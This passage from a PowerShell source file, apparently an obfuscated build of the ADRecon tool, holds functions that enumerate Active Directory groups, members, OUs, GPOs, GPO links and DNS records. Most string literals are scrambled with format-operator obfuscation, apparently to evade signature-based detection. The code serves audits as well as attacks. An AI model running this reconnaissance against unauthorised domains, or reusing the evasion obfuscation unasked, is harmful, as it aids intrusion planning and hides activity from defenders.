        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ("{0}{4}{3}{1}{2}"-f'(objec','=gro','up)','ss','tCla')
        $ObjSearcher.PropertiesToLoad.AddRange((("{1}{0}{3}{2}"-f'in','adm','t','coun'),("{0}{3}{1}{2}"-f 'cano','n','ame','nical'), ("{3}{1}{2}{4}{0}" -f'me','sti','nguish','di','edna'), ("{1}{2}{3}{0}"-f'on','desc','ript','i'), ("{2}{1}{0}"-f'pe','upty','gro'),("{2}{1}{0}" -f'e','m','samaccountna'), ("{1}{2}{0}"-f 'ory','si','dhist'), ("{2}{1}{3}{0}" -f 'edby','ana','m','g'), ("{2}{3}{1}{0}" -f 'data','valuemeta','m','sds-repl'), ("{1}{0}{2}"-f'bjects','o','id'), ("{1}{2}{3}{0}" -f 'reated','wh','e','nc'), ("{0}{1}{2}" -f'whenchan','g','ed')))
        $ObjSearcher.SearchScope = ("{0}{1}{2}"-f'S','u','btree')

        Try
        {
            $ADGroups = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{9}{11}{5}{6}{0}{8}{3}{12}{4}{10}{1}{2}{7}" -f'RGro','erati','ng Group O','Err','e ','t-A','D','bjects','up] ','[','enum','Ge','or whil')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.LDAPClass]::ObjectCount($ADGroups)) "
            If ($ADRGroups)
            {
                $GroupObj = [ADRecon.LDAPClass]::GroupParser($ADGroups, $Threads)
            }
            If ($ADRGroupChanges)
            {
                $GroupChangesObj = [ADRecon.LDAPClass]::GroupChangeParser($ADGroups, $date, $Threads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If ($GroupObj)
    {
        Export-ADR -ADRObj $GroupObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}" -f'G','roups')
        Remove-Variable GroupObj
    }

    If ($GroupChangesObj)
    {
        Export-ADR -ADRObj $GroupChangesObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{3}{0}{1}"-f'upChan','ges','Gr','o')
        Remove-Variable GroupChangesObj
    }
}

Function Get-ADRGroupMember
{
<#
.SYNOPSIS
    Returns all groups and their members in the current (or specified) domain.

.DESCRIPTION
    Returns all groups and their members in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}"-f'DWS','A'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
            $ADDomainSID = $ADDomain.DomainSID.Value
            Remove-Variable ADDomain
        }
        Catch
        {
            Write-Warning ("{7}{2}{8}{4}{11}{9}{14}{10}{5}{12}{13}{3}{1}{0}{6}" -f'te','n','-AD','o','pMember',' get','xt','[Get','RGrou','r','or','] E','ting Domai','n C','r')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADGroups = $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties SamAccountName,SID )
        }
        Catch
        {
            Write-Warning ("{11}{9}{5}{8}{6}{2}{1}{7}{0}{3}{4}{10}"-f'num','or wh','r','erating Gro','up Objec','DRGroup','ember] Er','ile e','M','-A','ts','[Get')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            $ADGroupMembers = @( Get-ADObject -LDAPFilter ((("{3}{4}{2}{0}{5}{1}"-f 'ou','id=*))','marygr','({0}(mem','berof=*)(pri','p'))-F  [CHaR]124) -Properties DistinguishedName,ObjectClass,memberof,primaryGroupID,sAMAccountName,samaccounttype )
        }
        Catch
        {
            Write-Warning ("{6}{10}{0}{16}{3}{1}{4}{14}{12}{7}{5}{2}{9}{15}{13}{8}{11}{17}" -f 'ADRGro','Me','enumera','p','mb','e ','[G','il','upMem','tin','et-','ber ',' wh','Gro','er] Error','g ','u','Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.ADWSClass]::ObjectCount($ADGroupMembers)) "
            $GroupMemberObj = [ADRecon.ADWSClass]::GroupMemberParser($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($Method -eq ("{1}{0}"-f 'AP','LD'))
    {

        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}" -f 'ain','Dom'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ("{9}{7}{5}{2}{6}{1}{10}{3}{0}{4}{8}" -f ' ','Do','g','n','Contex','ror ','etting ','t-ADRGroupMember] Er','t','[Ge','mai')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{2}{1}" -f'For','st','e'),$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning ("{4}{0}{2}{5}{1}{8}{3}{6}{7}"-f '-ADRGroupMem','g','be',' Con','[Get','r] Error gettin','t','ext',' Forest')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                    $ADObject.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                $ADObject.dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ("{0}{3}{2}{4}{1}" -f '(o','up)','ectCl','bj','ass=gro')
        $ObjSearcher.PropertiesToLoad.AddRange((("{1}{2}{0}"-f'tname','sama','ccoun'), ("{2}{0}{1}" -f 'bjec','tsid','o')))
        $ObjSearcher.SearchScope = ("{1}{0}{2}" -f 'ubtr','S','ee')

        Try
        {
            $ADGroups = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{7}{10}{4}{9}{6}{2}{5}{1}{3}{8}{0}"-f's','Group','i',' Objec','GroupM','ng ','ror while enumerat','[Get-A','t','ember] Er','DR')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ((("{3}{6}{0}{1}{5}{2}{4}" -f'of=*)(prim','aryg','id=','(K5C(m','*))','roup','ember'))  -CREplACE 'K5C',[Char]124)
        $ObjSearcher.PropertiesToLoad.AddRange((("{2}{3}{1}{0}{4}" -f'dnam','e','distingu','ish','e'), ("{1}{0}{2}"-f'am','dnshostn','e'), ("{2}{0}{1}" -f 'ectcl','ass','obj'), ("{2}{0}{1}{3}" -f'ry','g','prima','roupid'), ("{1}{2}{0}" -f 'f','memb','ero'), ("{2}{4}{3}{0}{1}"-f'untn','ame','s','cco','ama'), ("{1}{3}{2}{0}"-f 'ype','samacc','ntt','ou')))
        $ObjSearcher.SearchScope = ("{0}{1}" -f 'Sub','tree')

        Try
        {
            $ADGroupMembers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{10}{7}{2}{4}{8}{6}{0}{9}{1}{3}{5}" -f 'mber] Error while enu','rating GroupMember Obj','t-A','ec','DRGrou','ts','e','e','pM','me','[G')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.LDAPClass]::ObjectCount($ADGroupMembers)) "
            $GroupMemberObj = [ADRecon.LDAPClass]::GroupMemberParser($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($GroupMemberObj)
    {
        Return $GroupMemberObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADROU
{
<#
.SYNOPSIS
    Returns all Organizational Units (OU) in the current (or specified) domain.

.DESCRIPTION
    Returns all Organizational Units (OU) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}"-f 'DWS','A'))
    {
        Try
        {
            $ADOUs = @( Get-ADOrganizationalUnit -Filter * -Properties DistinguishedName,Description,Name,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning ("{4}{10}{5}{8}{9}{6}{1}{2}{3}{0}{7}" -f'ct','Error while enume','rating ','OU Obje','[Ge','ADRO',' ','s','U',']','t-')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.ADWSClass]::ObjectCount($ADOUs)) "
            $OUObj = [ADRecon.ADWSClass]::OUParser($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($Method -eq ("{0}{1}" -f 'LDA','P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = (("{8}{4}{1}{6}{0}{9}{7}{2}{5}{3}" -f'org','as','ati','nit)','bjectcl','onalu','s=','iz','(o','an'))
        $ObjSearcher.PropertiesToLoad.AddRange((("{0}{1}{3}{2}"-f'd','istin','e','guishednam'),("{0}{1}{2}"-f 'd','es','cription'),("{0}{1}"-f 'n','ame'),("{2}{0}{3}{1}"-f 'en','eated','wh','cr'),("{0}{2}{1}" -f'whenc','ed','hang')))
        $ObjSearcher.SearchScope = ("{1}{2}{0}"-f'ree','Sub','t')

        Try
        {
            $ADOUs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{3}{11}{4}{2}{6}{7}{1}{5}{8}{0}{10}{9}" -f'rating OU O','or wh','DRO','[','et-A','ile','U] ','Err',' enume','s','bject','G')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.LDAPClass]::ObjectCount($ADOUs)) "
            $OUObj = [ADRecon.LDAPClass]::OUParser($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($OUObj)
    {
        Return $OUObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGPO
{
<#
.SYNOPSIS
    Returns all Group Policy Objects (GPO) in the current (or specified) domain.

.DESCRIPTION
    Returns all Group Policy Objects (GPO) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{0}{1}" -f'A','DWS'))
    {
        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter (("{6}{7}{8}{9}{1}{2}{5}{3}{0}{4}" -f 'ner','Po','licyC','i',')','onta','(ob','jec','tCategory=g','roup')) -Properties DisplayName,DistinguishedName,Name,gPCFileSysPath,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning ("{6}{8}{9}{4}{2}{5}{10}{7}{3}{0}{11}{1}" -f 'icyContainer','bjects','h','g groupPol','r w','ile enum','[Get-','atin','ADRGPO] ','Erro','er',' O')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.ADWSClass]::ObjectCount($ADGPOs)) "
            $GPOsObj = [ADRecon.ADWSClass]::GPOParser($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LDA','P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ("{0}{7}{6}{1}{5}{3}{2}{4}"-f'(','Catego','olicyC','pP','ontainer)','ry=grou','bject','o')
        $ObjSearcher.SearchScope = ("{1}{0}" -f'ee','Subtr')

        Try
        {
            $ADGPOs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{8}{14}{5}{3}{6}{4}{13}{7}{15}{10}{12}{16}{2}{1}{9}{11}{0}" -f'bjects','Cont','g groupPolicy',' E','o',']','rr','hile','[Get','aine','enu','r O','mer','r w','-ADRGPO',' ','atin')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.LDAPClass]::ObjectCount($ADGPOs)) "
            $GPOsObj = [ADRecon.LDAPClass]::GPOParser($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($GPOsObj)
    {
        Return $GPOsObj
    }
    Else
    {
        Return $null
    }
}

# based on https://github.com/GoateePFE/GPLinkReport/blob/master/gPLinkReport.ps1
Function Get-ADRGPLink
{
<#
.SYNOPSIS
    Returns all group policy links (gPLink) applied to Scope of Management (SOM) in the current (or specified) domain.

.DESCRIPTION
    Returns all group policy links (gPLink) applied to Scope of Management (SOM) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}"-f'DWS','A'))
    {
        Try
        {
            $ADSOMs = @( Get-ADObject -LDAPFilter ((("{9}{0}{6}{5}{3}{1}{4}{2}{8}{7}"-f '0}(objectclas','ass','ani','jectcl','=org','main)(ob','s=do','ionalUnit))','zat','({'))-f  [Char]124) -Properties DistinguishedName,Name,gPLink,gPOptions )
            $ADSOMs += @( Get-ADObject -SearchBase "CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter (("{5}{2}{1}{4}{0}{3}"-f 'ass=si','bjectc','o','te)','l','(')) -Properties DistinguishedName,Name,gPLink,gPOptions )
        }
        Catch
        {
            Write-Warning ("{4}{0}{8}{6}{3}{2}{7}{1}{5}"-f'-ADRGPLink]','ting ','e enum','r whil','[Get','SOM Objects','ro','era',' Er')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter ("{0}{2}{5}{6}{3}{4}{1}" -f'(objec','tainer)','tCategory','P','olicyCon','=gr','oup') -Properties DisplayName,DistinguishedName )
        }
        Catch
        {
            Write-Warning ("{12}{10}{7}{0}{4}{11}{6}{8}{1}{2}{3}{5}{9}" -f 'in','g gro','upPolicy','Container','k] Error w',' Ob','mer','DRGPL','atin','jects','t-A','hile enu','[Ge')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.ADWSClass]::ObjectCount($ADSOMs)) "
            $SOMObj = [ADRecon.ADWSClass]::SOMParser($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LD','AP'))
    {
        $ADSOMs = @()
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ((("{13}{15}{9}{1}{2}{4}{14}{5}{6}{7}{10}{0}{3}{8}{11}{12}"-f'tc','c','t','lass','c','s=','domain)','(obj','=organiz','e','ec','ationalUnit)',')','({0','las','}(obj'))-f [Char]124)
        $ObjSearcher.PropertiesToLoad.AddRange((("{4}{2}{0}{3}{1}"-f 's','me','i','hedna','distingu'),("{1}{0}"-f'ame','n'),("{1}{0}{2}"-f 'l','gp','ink'),("{0}{1}"-f 'gpoption','s')))
        $ObjSearcher.SearchScope = ("{1}{0}"-f 'ee','Subtr')

        Try
        {
            $ADSOMs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{8}{3}{5}{4}{2}{7}{9}{6}{10}{11}{1}{0}"-f 'cts','e','GPL','-','DR','A','rror while en','i','[Get','nk] E','umerating SOM ','Obj')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        $SearchPath = ("{1}{0}" -f 's','CN=Site')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = (("{3}{0}{2}{4}{1}" -f 'obj','=site)','ec','(','tclass'))
        $ObjSearcher.PropertiesToLoad.AddRange((("{2}{4}{3}{1}{0}"-f 'name','hed','dis','is','tingu'),("{0}{1}" -f'na','me'),("{0}{1}"-f'gp','link'),("{0}{1}{2}" -f'gpop','t','ions')))
        $ObjSearcher.SearchScope = ("{2}{1}{0}"-f 'btree','u','S')

        Try
        {
            $ADSOMs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{6}{10}{8}{9}{13}{3}{12}{4}{1}{0}{15}{11}{14}{5}{7}{2}"-f'r',' Erro','umerating SOM Objects','in',']',' ','[Get-','en','G','P','ADR','h','k','L','ile',' w')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ("{0}{5}{4}{1}{3}{6}{7}{2}"-f'(o','=gr','ainer)','oupPolicyC','y','bjectCategor','o','nt')
        $ObjSearcher.SearchScope = ("{1}{0}"-f 'e','Subtre')

        Try
        {
            $ADGPOs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{11}{9}{7}{15}{3}{10}{6}{4}{14}{1}{17}{5}{2}{8}{0}{12}{13}{16}"-f 'j','ing g','ne','Li','hile enumera','cyContai',' w','-ADRG','r Ob','Get','nk] Error','[','ec','t','t','P','s','roupPoli')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.LDAPClass]::ObjectCount($ADSOMs)) "
            $SOMObj = [ADRecon.LDAPClass]::SOMParser($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($SOMObj)
    {
        Return $SOMObj
    }
    Else
    {
        Return $null
    }
}

# Modified Convert-DNSRecord function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Convert-DNSRecord
{
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

Author: Michael B. Smith, Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType({"{7}{5}{3}{6}{1}{4}{2}{0}"-f 't','to','bjec','.A','mation.PSCustomO','agement','u','System.Man'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        Function Get-Name
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{5}{1}{6}{4}{3}{0}"-f'ly','tput','P','rrect','o','SUseOu','TypeC'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0)
                {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS
    {
        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        # reverse for big endian
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        If ($Age -ne 0)
        {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        Else
        {
            $TimeStamp = ("{2}{0}{1}" -f'tatic',']','[s')
        }

        $DNSRecordObject = New-Object PSObject

        switch ($RDataType)
        {
            1
            {
                $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
                $Data = $IP
                $DNSRecordObject | Add-Member Noteproperty ("{0}{1}{2}" -f'R','ecord','Type') 'A'
            }

            2
            {
                $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $NSName
                $DNSRecordObject | Add-Member Noteproperty ("{0}{1}{2}"-f 'Re','co','rdType') 'NS'
            }

            5
            {
                $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $Alias
                $DNSRecordObject | Add-Member Noteproperty ("{1}{2}{0}" -f'Type','R','ecord') ("{1}{0}" -f'E','CNAM')
            }

            6
            {
                $PrimaryNS = Get-Name $DNSRecord[44..$DNSRecord.length]
                $ResponsibleParty = Get-Name $DNSRecord[$(46+$DNSRecord[44])..$DNSRecord.length]
                $SerialRaw = $DNSRecord[24..27]
                # reverse for big endian
                $Null = [array]::Reverse($SerialRaw)
                $Serial = [BitConverter]::ToUInt32($SerialRaw, 0)

                $RefreshRaw = $DNSRecord[28..31]
                $Null = [array]::Reverse($RefreshRaw)
                $Refresh = [BitConverter]::ToUInt32($RefreshRaw, 0)

                $RetryRaw = $DNSRecord[32..35]
                $Null = [array]::Reverse($RetryRaw)
                $Retry = [BitConverter]::ToUInt32($RetryRaw, 0)

                $ExpiresRaw = $DNSRecord[36..39]
                $Null = [array]::Reverse($ExpiresRaw)
                $Expires = [BitConverter]::ToUInt32($ExpiresRaw, 0)

                $MinTTLRaw = $DNSRecord[40..43]
                $Null = [array]::Reverse($MinTTLRaw)
                $MinTTL = [BitConverter]::ToUInt32($MinTTLRaw, 0)

                $Data = "[" + $Serial + "][" + $PrimaryNS + "][" + $ResponsibleParty + "][" + $Refresh + "][" + $Retry + "][" + $Expires + "][" + $MinTTL + "]"
                $DNSRecordObject | Add-Member Noteproperty ("{0}{1}{2}"-f 'R','ecordTy','pe') 'SOA'
            }

            12
            {
                $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $Ptr
                $DNSRecordObject | Add-Member Noteproperty ("{0}{2}{1}"-f'Rec','dType','or') 'PTR'
            }

            13
            {
                [string]$CPUType = ""
                [string]$OSType  = ""
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $CPUType += [char]$DNSRecord[$Index++]
                }
                $Index = 24 + $DNSRecord[24] + 1
                [int]$SegmentLength = $Index++
                while ($SegmentLength-- -gt 0)
                {
                    $OSType += [char]$DNSRecord[$Index++]
                }
                $Data = "[" + $CPUType + "][" + $OSType + "]"
                $DNSRecordObject | Add-Member Noteproperty ("{2}{1}{0}{3}"-f 'p','rdTy','Reco','e') ("{1}{0}" -f 'INFO','H')
            }

            15
            {
                $PriorityRaw = $DNSRecord[24..25]
                # reverse for big endian
                $Null = [array]::Reverse($PriorityRaw)
                $Priority = [BitConverter]::ToUInt16($PriorityRaw, 0)
                $MXHost   = Get-Name $DNSRecord[26..$DNSRecord.length]
                $Data = "[" + $Priority + "][" + $MXHost + "]"
                $DNSRecordObject | Add-Member Noteproperty ("{1}{0}{2}" -f'ec','R','ordType') 'MX'
            }

            16
            {
                [string]$TXT  = ''
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $TXT += [char]$DNSRecord[$Index++]
                }
                $Data = $TXT
                $DNSRecordObject | Add-Member Noteproperty ("{1}{2}{0}" -f'ype','Re','cordT') 'TXT'
            }

            28
            {
        		### yeah, this doesn't do all the fancy formatting that can be done for IPv6
                $AAAA = ""
                for ($i = 24; $i -lt 40; $i+=2)
                {
                    $BlockRaw = $DNSRecord[$i..$($i+1)]
                    # reverse for big endian
                    $Null = [array]::Reverse($BlockRaw)
